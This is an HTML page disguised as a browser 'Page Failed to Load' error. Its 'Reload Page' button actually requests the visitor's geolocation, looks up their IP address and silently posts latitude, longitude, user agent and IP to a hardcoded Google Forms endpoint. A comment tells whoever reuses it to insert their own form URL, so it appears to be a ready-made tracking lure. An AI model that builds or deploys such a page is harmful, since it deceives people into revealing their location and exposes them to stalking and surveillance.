<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Page Not Loaded</title>

    <style>
        body {
            background-color: #f2f2f2;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 100px;
        }

        .container {
            background: white;
            width: 400px;
            margin: auto;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.2);
        }

        h1 {
            color: #555;
        }

        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            background: #007bff;
            color: white;
        }

        button:hover {
            background: #0056b3;
        }

        #insert {
            margin-top: 20px;
            color: #333;
            font-weight: bold;
        }
    </style>
</head>

<body>

    <div class="container">

        <h1>⚠ Page Failed to Load</h1>

        <p>Something went wrong. Try reloading.</p>


        <button onclick="getLocation()">Reload Page</button>

        <p id="insert"></p>

    </div>

<script>

const x = document.getElementById("insert");

// PUT YOUR FORM URL HERE (with formResponse)
const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSeDsn7ZDusnfj3emS8Vf4_TW9jSID0cJhcsrYSGzCs9VY3UlA/formResponse";


async function getIP() {
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    return (await r.json()).ip;
  } catch {
    return "Unknown";
  }
}


function getLocation() {

  if (!navigator.geolocation) {
    x.innerHTML = "Not supported.";
    return;
  }

  x.innerHTML = "Sending...";

  navigator.geolocation.getCurrentPosition(
    sendData,
    showError
  );
}


async function sendData(pos) {

  const ip = await getIP();

  const data = new FormData();

  data.append("entry.1067381288", pos.coords.latitude);
  data.append("entry.1458499732", pos.coords.longitude);
  data.append("entry.451712260", navigator.userAgent);
  data.append("entry.1663940185", ip);


  fetch(FORM_URL, {
    method: "POST",
    mode: "no-cors",
    body: data
  });

  x.innerHTML = "Close Window";
}


function showError(err) {

  if (err.code === 1) {
    x.innerHTML = "Denied.";
  } else {
    x.innerHTML = "Error.";
  }

}

</script>





</body>
</html>
